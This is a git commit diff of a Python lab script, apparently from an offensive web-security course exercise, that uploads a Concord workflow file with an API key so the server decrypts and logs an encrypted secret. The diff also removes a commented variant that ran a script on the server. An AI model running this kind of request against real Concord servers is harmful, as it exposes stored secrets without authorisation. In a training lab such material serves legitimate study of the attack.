5207e7e5e51827e1e662863b6ab881f3c7053744
dvdg6566 <czhdaniel@gmail.com>
2024-06-14 13:30:53 +0800

    Exercise 11.3.1.1

--- labs/concord/exercise_11.3.1.1.py
+++ labs/concord/exercise_11.3.1.1.py
@@ -2,29 +2,15 @@ import requests
 
 key = "vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf"
 
-# yml = f"""
-# configuration:
-#   dependencies:
-#   - "mvn://org.python:jython-standalone:2.7.2"
-
-# flows:
-#   default:
-#   - script: python
-#     body: |
-#       print("Whoami")
-#   - log: \"Hello, ${{crypto.decryptString('{key}')}}\"
-# """
-
-yml = """
+yml = f"""
 flows:
   default:
-  - log: "Hello"
+  - log: \"Hello, ${{crypto.decryptString('{key}')}}\"
 """
 
 print(yml)
 
 api_key = "auBy4eDWrKWsyhiDp3AQiw"
-
 s = requests.Session()
 
 proxies = {
@@ -42,6 +28,11 @@ files = {
   'concord.yml': ("concord.yml", yml, 'application/yml')
 }
 
-r = s.post(target, headers=headers, files=files)
+data = {
+	"orgId": "a33f418a-a474-11eb-a57c-0242ac120003",
+	"project": "AWAE"
+}
+
+r = s.post(target, headers=headers, files=files, data=data)
 
 print(r.text)
